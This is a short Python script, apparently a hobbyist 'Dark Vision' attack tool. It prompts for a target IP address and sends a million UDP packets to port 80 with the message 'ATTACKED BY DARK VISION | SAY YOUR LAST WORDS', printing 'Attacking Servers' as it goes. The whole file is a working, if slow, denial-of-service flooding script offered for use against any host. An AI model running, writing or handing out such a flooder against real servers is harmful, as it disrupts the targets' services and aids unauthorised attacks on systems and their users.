import socket 
import time
import os

def send_udp_packet(target_ip, target_port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode(), (target_ip, target_port))
def main():
    print("===========================================")
    target_ip=input("Enter Target's Ip: ")
    print("===========================================")
    target_port = 80
    message = "ATTACKED BY DARK VISION | SAY YOUR LAST WORDS"
    print("Creating Network Traffic ... ")
    print("===========================================")
    for i in range(1000000):
        send_udp_packet(target_ip, target_port, message)
        time.sleep(0.25)
        print("===========================================")
        print("Attacking Servers ... ")
    print("===========================================")
    print("Attack Completed ")
    print("===========================================")
main()